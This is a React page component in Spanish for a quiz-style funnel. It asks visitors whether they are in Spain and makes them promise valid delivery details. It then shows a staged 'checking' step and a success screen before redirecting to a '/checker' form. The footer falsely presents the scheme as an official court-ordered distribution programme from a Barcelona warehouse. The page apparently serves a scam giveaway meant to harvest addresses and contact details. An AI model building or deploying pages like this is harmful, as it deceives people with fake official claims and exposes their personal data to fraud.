import { useState } from "react";
import { AnimatePresence } from "framer-motion";
import { HeroSection } from "@/components/HeroSection";
import { QuizStep } from "@/components/QuizStep";
import { LoadingCheck } from "@/components/LoadingCheck";
import { SuccessConfirmation } from "@/components/SuccessConfirmation";

type Step = "hero" | "location" | "promise" | "loading" | "success";

const Index = () => {
  const [currentStep, setCurrentStep] = useState<Step>("hero");

  const handleNext = (nextStep: Step) => {
    setCurrentStep(nextStep);
  };

  const handleClaimClick = () => {
    // This would navigate to the checker/form page
    window.location.href = "/checker";
  };

  return (
    <div className="min-h-screen bg-hero-gradient flex flex-col">
      {/* Efectos de fondo */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-primary/10 rounded-full blur-3xl" />
        <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-primary/5 rounded-full blur-3xl" />
      </div>

      {/* Encabezado */}
      <header className="relative z-10 flex items-center justify-between px-6 py-4">
        <div className="text-lg font-bold text-foreground">
         
        </div>
        <div className="text-xs text-muted-foreground">
      
        </div>
      </header>

      {/* Contenido principal */}
      <main className="relative z-10 flex-1 flex items-center justify-center py-8">
        <div className="w-full max-w-3xl">
          <AnimatePresence mode="wait">
            {currentStep === "hero" && (
              <HeroSection
                key="hero"
                onStart={() => handleNext("location")}
              />
            )}

            {currentStep === "location" && (
              <QuizStep
                key="location"
                question="¿Estás en España?"
                description="Esta oferta solo está disponible para residentes dentro del territorio español debido a las normas de distribución."
                onConfirm={() => handleNext("promise")}
                buttonText="Sí, estoy en España"
              />
            )}

            {currentStep === "promise" && (
              <QuizStep
                key="promise"
                question="¿Prometes proporcionar información de entrega válida?"
                description="Para asegurar una entrega correcta, necesitamos una dirección y datos de contacto precisos."
                onConfirm={() => handleNext("loading")}
                buttonText="Sí, lo prometo"
              />
            )}

            {currentStep === "loading" && (
              <LoadingCheck
                key="loading"
                onComplete={() => handleNext("success")}
              />
            )}

            {currentStep === "success" && (
              <SuccessConfirmation
                key="success"
                onContinue={handleClaimClick}
              />
            )}
          </AnimatePresence>
        </div>
      </main>

      {/* Pie de página */}
      <footer className="relative z-10 px-6 py-4 text-center text-xs text-muted-foreground">
        <p>© 2026 Distribución del Almacén de Barcelona. Todos los derechos reservados.</p>
        <p className="mt-1">Este es un programa oficial de distribución ordenado por un tribunal.</p>
      </footer>
    </div>
  );
};

export default Index;
